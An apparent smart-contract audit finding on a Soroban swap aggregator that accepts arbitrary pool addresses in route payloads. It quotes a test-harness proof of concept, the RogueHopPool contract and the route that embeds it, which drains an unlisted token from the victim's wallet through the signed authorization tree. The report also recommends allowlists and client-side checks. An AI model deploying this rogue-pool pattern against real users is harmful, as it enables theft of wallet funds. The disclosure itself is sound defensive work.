### Title
Attacker-crafted swap route places a rogue contract under the victim's authorization tree and drains arbitrary wallet tokens during strategy swaps - (File: contracts/swap-aggregator/src/venues/mod.rs)

### Summary
The swap-aggregator executes hops against pool and token addresses taken verbatim from the user-supplied route payload, with no allowlist of venues or assets. A malicious route can therefore put attacker-controlled contract code on the call stack *below the victim's authorization entry*. Any `token.transfer(victim, attacker, x)` that this code performs is recorded by `simulateTransaction` as a child invocation under the caller's root auth, and executes if the victim signs that tree. This is the on-chain analog of CVE-2024-6586: an attacker-supplied external reference (SSRF URL / route venue) silently carries an action that spends the victim's credentials (session token / signed auth tree).

### Finding Description
`dispatch_hop` in `contracts/swap-aggregator/src/venues/mod.rs` resolves `hop.pool`/token addresses from the payload's `assets` registry and invokes the venue adapter against them; there is no venue allowlist, only measured balance deltas around the call [1](#0-0) . The measured-delta checks only constrain the *router's* `token_in`/`token_out` balances — they say nothing about what the invoked contract does with other tokens.

The controller entrypoints `swap_collateral`, `swap_debt`, `repay_debt_with_collateral`, and `multiply` forward a caller-supplied `StrategySwap` to `router.execute_strategy` after granting only the exact input transfer (`authorize_transfer_as_current`) [2](#0-1) . The victim's `caller.require_auth()` is the root of the auth tree; route code executes beneath it.

The threat model itself confirms the gap: "a route can put third-party code on the call stack below the caller's authorization... The loss is then the caller's wallet, not the routed amount" [3](#0-2) . The dedicated test `rogue_hop_pool_transfer_joins_caller_auth_tree.rs` demonstrates a `RogueHopPool` contract named by the route payload that calls `token.transfer(victim, attacker, WALLET_BALANCE)` for a token the protocol never listed; recording-mode simulation attaches that transfer as a child of the victim's `swap_collateral` auth entry, and signing that tree executes the theft [4](#0-3) .

### Impact Explanation
Theft of user funds. Any token balance in the victim's wallet — including assets the protocol never lists — can be transferred to the attacker, up to the entire wallet balance, in a single transaction the victim believes is a fair collateral/debt swap (the route still delivers the expected `min_out`, so nothing looks anomalous on the outcome side). The exposure is not bounded by the routed amount, the payload minimum, or the post-swap health-factor gate.

### Likelihood Explanation
Exploitation requires tricking a victim into submitting an attacker-authored route — the same social/UI precondition as the CVE (a shared malicious dashboard). Any wallet/client that signs the simulated auth tree without decoding route children is vulnerable; `simulateTransaction` faithfully produces the poisoned tree, and honest UIs may not surface nested child invocations of unrelated token contracts. This is a documented, reproducible behavior (a dedicated test proves both the recording-mode attachment and the enforcing-mode execution), not a theoretical path. Likelihood is bounded by user-interaction and client-decoding requirements, which keeps it below critical.

### Recommendation
Mitigate at both layers:
- Router/controller: validate hop pool and token addresses against a venue/token allowlist (e.g., only pools resolvable from the listed DEX factory contracts, only protocol-listed tokens) so route payloads cannot name arbitrary contract addresses. Alternatively, constrain venue adapters to invoke only well-known pool ABIs on addresses registered by governance.
- Client-side (documented today): decode every route's `assets` registry and reject any pool address that is not a known DEX pool, and refuse to sign an authorization tree containing child invocations beyond the single expected input transfer. Enforcing the "exactly one child entry" rule that `threat-model.md` prescribes in wallets/UI closes the theft vector even if the contract remains permissive.

### Proof of Concept
See `tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs`, which is an executable PoC:

1. Alice supplies 10,000 USDC and holds `WALLET_BALANCE` of an unlisted `wallet_token` in her wallet [5](#0-4) .
2. The attacker deploys `RogueHopPool`, whose `swap()` calls `token.transfer(victim, attacker, amount)` on the victim's unlisted token [6](#0-5) , and embeds it as `hop_pool` in a `swap_collateral` route that still pays a fair ETH output [7](#0-6) .
3. In recording mode (`simulateTransaction`), the theft transfer is attached as a child of Alice's `swap_collateral` auth entry; the test asserts `alice` balance → 0 and `attacker` balance → `WALLET_BALANCE` while Alice receives the promised `FAIR_OUT_ETH` [8](#0-7) .
4. In enforcing mode, the same transaction succeeds iff Alice signs the poisoned tree containing the rogue `transfer` child [9](#0-8) .

### Citations

**File:** contracts/swap-aggregator/src/venues/mod.rs (L23-40)
```rust
pub(crate) fn dispatch_hop(
    env: &Env,
    router: &Address,
    hop: &SwapHop,
    amount_in: i128,
    tokens_cache: &mut Map<Address, Vec<Address>>,
) -> i128 {
    let ctx = HopContext::new(env, router, hop, amount_in);
    let before_in = ctx.input_balance();
    let before_out = ctx.output_balance();

    match hop.venue {
        SwapVenue::Soroswap => soroswap::swap(&ctx),
        SwapVenue::Aquarius => aquarius::swap(&ctx, tokens_cache),
        SwapVenue::Phoenix => phoenix::swap(&ctx),
        SwapVenue::Sushi => sushi::swap(&ctx),
        SwapVenue::CometDex => comet::swap(&ctx),
    };
```

**File:** contracts/controller/src/strategies/swap.rs (L33-38)
```rust
    // Authorize only this token transfer to this router for this exact amount.
    authorize_transfer_as_current(env, token_in, &controller, &router_addr, amount_in);

    storage::with_flash_guard(env, || {
        let _ = router.execute_strategy(&controller, &amount_in, swap);
    });
```

**File:** docs/explanation/threat-model.md (L154-165)
```markdown
That bound covers the controller's own grant only. The router calls the pool
and token addresses its payload names and keeps no allowlist of them, so a
route can put third-party code on the call stack below the caller's
authorization. A token transfer that such code makes from the caller is
recorded by an honest simulation as a child of the caller's authorization
entry, and it executes if the caller signs that tree. The loss is then the
caller's wallet, not the routed amount, and neither the payload minimum nor the
final risk gate bounds it. An honest swap strategy gives the caller no child
entry, and a direct router swap gives exactly one input transfer. A client must
decode the route it signs and refuse an authorization tree with any other
child. The direct `execute_strategy` path has the same exposure for every swap
user.
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L62-71)
```rust
    pub fn swap(env: Env) {
        let (victim, wallet_token, to, amount): (Address, Address, Address, i128) = env
            .storage()
            .instance()
            .get(&symbol_short!("PLAN"))
            .expect("plan is set by the constructor");
        if amount > 0 {
            token::Client::new(&env, &wallet_token).transfer(&victim, &to, &amount);
        }
    }
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L83-108)
```rust
    /// Debt-free Alice with 10 000 USDC supplied and an unrelated token in her wallet.
    fn new() -> Self {
        let mut t = LendingTest::new().standard_two_asset().build();
        t.supply(ALICE, "USDC", 10_000.0);
        let alice = t.get_or_create_user(ALICE);
        let account_id = t.resolve_account_id(ALICE);

        let router = t.env.register(UnlistedPoolRouter, ());
        t.ctrl_client().set_swap_aggregator(&router);
        t.resolve_market("ETH")
            .token_admin
            .mint(&router, &(4 * FAIR_OUT_ETH));

        let wallet_token = t
            .env
            .register_stellar_asset_contract_v2(t.admin.clone())
            .address();
        token::StellarAssetClient::new(&t.env, &wallet_token).mint(&alice, &WALLET_BALANCE);
        let attacker = Address::generate(&t.env);
        Self {
            t,
            alice,
            attacker,
            wallet_token,
            account_id,
        }
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L111-125)
```rust
    fn route_through_pool_stealing(&self, amount: i128) -> Bytes {
        let plan = (
            self.alice.clone(),
            self.wallet_token.clone(),
            self.attacker.clone(),
            amount,
        );
        RoutedSwap {
            hop_pool: self.t.env.register(RogueHopPool, plan),
            min_out: FAIR_OUT_ETH,
            token_in: self.t.resolve_asset("USDC"),
            token_out: self.t.resolve_asset("ETH"),
        }
        .to_xdr(&self.t.env)
    }
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L195-227)
```rust
fn simulation_records_the_rogue_pool_wallet_transfer_under_the_callers_swap_collateral_entry() {
    let s = Scene::new();
    let route = s.route_through_pool_stealing(WALLET_BALANCE);

    // `simulateTransaction` runs recording mode with non-root auth disabled.
    s.t.env.mock_all_auths();
    s.try_swap(&route)
        .expect("recording mode accepts the route");
    let recorded = s.t.env.auths();
    std::println!("recorded auth tree = {recorded:#?}");

    let stolen_transfer = AuthorizedInvocation {
        function: AuthorizedFunction::Contract((
            s.wallet_token.clone(),
            symbol_short!("transfer"),
            (s.alice.clone(), s.attacker.clone(), WALLET_BALANCE).into_val(&s.t.env),
        )),
        sub_invocations: std::vec![],
    };
    let poisoned_root = AuthorizedInvocation {
        function: AuthorizedFunction::Contract((
            s.t.controller.clone(),
            Symbol::new(&s.t.env, "swap_collateral"),
            s.swap_args(&route),
        )),
        sub_invocations: std::vec![stolen_transfer],
    };
    assert_eq!(recorded, std::vec![(s.alice.clone(), poisoned_root)]);

    assert_eq!(s.wallet(&s.alice), 0);
    assert_eq!(s.wallet(&s.attacker), WALLET_BALANCE);
    assert_eq!(s.t.supply_balance_raw(ALICE, "ETH"), FAIR_OUT_ETH);
}
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L258-268)
```rust
    // Same route, with the tree that simulation returned.
    let stolen_transfer = MockAuthInvoke {
        contract: &s.wallet_token,
        fn_name: "transfer",
        args: (s.alice.clone(), s.attacker.clone(), WALLET_BALANCE).into_val(&s.t.env),
        sub_invokes: &[],
    };
    s.try_swap_with_signed_tree(&rogue, core::slice::from_ref(&stolen_transfer))
        .expect("the poisoned tree authorizes the rogue transfer");
    assert_eq!(s.wallet(&s.alice), 0);
    assert_eq!(s.wallet(&s.attacker), WALLET_BALANCE);
```
